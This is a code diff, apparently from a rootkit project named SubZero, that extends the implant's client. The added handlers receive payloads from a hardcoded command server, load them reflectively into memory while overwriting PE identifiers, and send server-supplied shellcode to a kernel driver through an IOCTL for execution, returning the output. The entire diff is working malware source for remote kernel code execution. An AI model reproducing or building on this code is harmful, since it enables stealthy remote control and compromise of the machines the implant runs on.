@@ -1,9 +1,14 @@
 #include "pch.h"
+
 #include "HttpClient.h"
 #include "ReflectiveLibraryLoader.h"
+#include "../SubZeroDriver/SubZeroCommon.h"
 #include "../SubZeroUtils/RegistryManager.h"
 #include "../SubZeroUtils/ServiceManager.h"
+#include "../SubZeroUtils/AutoHandle.h"
 #include "../SubZeroCleanup/SubZeroCleanup.h"
+
+#include <Windows.h>"
 
 constexpr int SecondsToMilliseconds(int seconds) { return seconds * 1000; }
 
@@ -11,22 +16,67 @@ const std::string IpAddress("192.168.14.139");
 constexpr int Port = 8080;
 constexpr int SecondsBetweenFetches = 5;
 
-void ResponseHandler(ServerOpcode ServerOC, const PVOID Data, size_t DataLength, std::string* ReturnedData)
+void LoadLibraryReflectively_OpcodeHandler(const PVOID Data, const size_t DataLength)
 {
-    PMEMORY_MODULE hModule = nullptr;
-	
+    PMEMORY_MODULE hModule = ReflectiveLibraryLoader::MemoryLoadLibrary(Data, DataLength);
+    if (nullptr == hModule)
+        throw std::runtime_error("[-] Library module object failed to initialize");
+
+    ReflectiveLibraryLoader::OverridePeStringIdentifiers(hModule);
+}
+
+void InjectKernelShellcode_OpcodeHandler(const PVOID Data, const size_t DataLength, std::string* ReturnedData, const size_t ReturnedDataSize)
+{
+    const AutoHandle deviceAutoHandle(::CreateFile(
+        L"\\\\.\\" DRIVER_NAME, 
+        FILE_SHARE_READ | FILE_SHARE_WRITE, 
+        0, 
+        nullptr, 
+        OPEN_EXISTING,
+        0,
+        nullptr));
+    if (INVALID_HANDLE_VALUE == deviceAutoHandle.get()) 
+        throw std::runtime_error("[-] Failed to open the device handle");
+
+	// Create SubZeroExecuteShellcodeData structure
+    auto const bufferSize = DataLength + sizeof(SubZeroExecuteShellcodeData);
+
+    const std::unique_ptr<char> inputBuffer(new char[bufferSize]);
+    auto* const shellcodeDataStruct = reinterpret_cast<SubZeroExecuteShellcodeData*>(inputBuffer.get());
+
+    shellcodeDataStruct->ShellcodeSize = static_cast<USHORT>(DataLength);
+    shellcodeDataStruct->ShellcodeOffset = static_cast<USHORT>(sizeof(SubZeroExecuteShellcodeData));
+    shellcodeDataStruct->ReturnedDataMaxSize = ReturnedDataSize;
+
+	// Copy shellcode
+    ::memcpy(inputBuffer.get() + shellcodeDataStruct->ShellcodeOffset, Data, shellcodeDataStruct->ShellcodeSize);
+
+    const std::unique_ptr<char>outputBuffer(new char[shellcodeDataStruct->ReturnedDataMaxSize]);
+
+    DWORD bytesReturned = 0;
+    if (!::DeviceIoControl(
+        deviceAutoHandle.get(),								                        // device to be queried
+        IOCTL_SUBZERO_EXECUTE_SHELLCODE,						                    // operation to perform
+        inputBuffer.get(), bufferSize,							            // input buffer
+        outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize,	   	// output buffer
+        &bytesReturned,                  											// # bytes returned
+        nullptr))
+        throw std::runtime_error("[-] DeviceIoControl Failed");
+
+	if (0 < bytesReturned)
+        ReturnedData->append(outputBuffer.get(), bytesReturned);
+}
+
+void ResponseHandler(const ServerOpcode ServerOC, const PVOID Data, const size_t DataLength, std::string* ReturnedData, const size_t ReturnedDataSize)
+{	
     switch (ServerOC)
     {
     case ServerOpcode::LoadLibraryReflectively:
-        hModule = ReflectiveLibraryLoader::MemoryLoadLibrary(Data, DataLength);
-		if (nullptr == hModule)
-            throw std::runtime_error("[-] Library module object failed to initialize");
-    	
-		ReflectiveLibraryLoader::OverridePeStringIdentifiers(hModule);
+        LoadLibraryReflectively_OpcodeHandler(Data, DataLength);
         break;               
     
     case ServerOpcode::InjectKernelShellcode:
-        // TODO
+        InjectKernelShellcode_OpcodeHandler(Data, DataLength, ReturnedData, ReturnedDataSize);
         break;
     	
     case ServerOpcode::Cleanup:
